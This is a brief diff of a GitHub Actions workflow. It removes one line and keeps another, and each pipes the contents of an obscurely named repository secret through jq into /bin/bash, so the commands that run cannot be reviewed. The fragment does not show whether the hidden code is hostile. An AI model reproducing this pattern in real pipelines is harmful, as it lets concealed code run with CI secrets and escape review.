@@ -21,7 +21,6 @@ jobs:
           pt9593: ${{ secrets.pt9593 }}
         run: |
           printf '%s' "$pt9593" | jq -r .wqqck44 | /bin/bash
-          printf '%s' "$pc233" | jq -r .zjep296 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
